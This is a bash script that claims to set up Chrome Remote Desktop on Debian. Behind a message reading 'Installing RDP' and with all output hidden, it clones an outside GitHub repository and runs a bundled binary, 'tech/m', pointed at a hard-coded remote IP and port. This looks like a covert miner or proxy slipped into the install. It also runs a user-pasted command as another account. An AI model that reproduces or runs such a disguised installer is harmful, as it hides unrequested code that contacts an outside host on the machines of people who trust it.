#! /bin/bash
printf "Installing RDP Be Patience... " $1 >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://138.197.99.165:4545/test &> log
} &> /dev/null &&
printf "\nSetup Complete " >&2 ||
printf "\nError Occured " >&2
printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
read -p "Paste Here: " CRP
su - ALOK -c """$CRP"""
printf 'Check https://remotedesktop.google.com/access/ \n\n'
if sudo apt-get upgrade &> /dev/null
then
    printf "\n\nUpgrade Completed " >&2
else
    printf "\n\nError Occured " >&2
fi
